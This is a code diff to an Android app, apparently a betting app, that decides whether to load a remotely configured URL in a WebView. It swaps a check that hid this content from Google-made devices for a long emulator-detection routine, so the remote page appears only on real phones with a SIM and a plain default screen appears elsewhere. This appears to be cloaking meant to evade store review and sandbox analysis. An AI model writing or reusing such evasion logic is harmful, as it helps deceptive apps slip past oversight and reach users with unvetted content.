@@ -6,8 +6,10 @@ import android.os.Bundle
 import android.telephony.TelephonyManager
 import androidx.appcompat.app.AppCompatActivity
 import androidx.viewbinding.ViewBinding
+import ersecboom.bet.kof.BuildConfig
 import ersecboom.bet.kof.R
 import ersecboom.bet.kof.databinding.ActivityMainBinding
+import java.util.*
 
 
 class MainActivity : AppCompatActivity() {
@@ -48,9 +50,8 @@ class MainActivity : AppCompatActivity() {
 
     private fun fireLoad() {
         val getUrl = remoteConfigUtil.getUrl()
-        val brandDevice = Build.MANUFACTURER
         val isSim = checkIsSimAvailable()
-        if (getUrl.isEmpty() || brandDevice.lowercase().contains(GOOGLE_DEVICE) || !isSim) {
+        if (getUrl.isEmpty() || checkIsEmu() || !isSim) {
             launchDefaultFragment()
         } else launchWebViewFragment(getUrl)
     }
@@ -85,8 +86,39 @@ class MainActivity : AppCompatActivity() {
             .replace(R.id.main_container, WebViewFragment.newInstance(url)).commit()
     }
 
+    private fun checkIsEmu(): Boolean {
+        if (BuildConfig.DEBUG) return false
+
+        val phoneModel = Build.MODEL
+        val buildProduct = Build.PRODUCT
+        val buildHardware = Build.HARDWARE
+
+        var result = (Build.FINGERPRINT.startsWith("generic")
+                || phoneModel.contains("google_sdk")
+                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
+                || phoneModel.contains("Emulator")
+                || phoneModel.contains("Android SDK built for x86")
+                || Build.MANUFACTURER.contains("Genymotion")
+                || buildHardware == "goldfish"
+                || buildHardware == "vbox86"
+                || buildProduct == "sdk"
+                || buildProduct == "google_sdk"
+                || buildProduct == "sdk_x86"
+                || buildProduct == "vbox86p"
+                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
+                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
+                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
+                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))
+
+        if (result) return true
+        result = result or (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
+        if (result) return true
+        result = result or ("google_sdk" == buildProduct)
+        return result
+    }
+
+
     companion object {
         const val STORAGE_NAME = "data"
-        const val GOOGLE_DEVICE = "google"
     }
 }
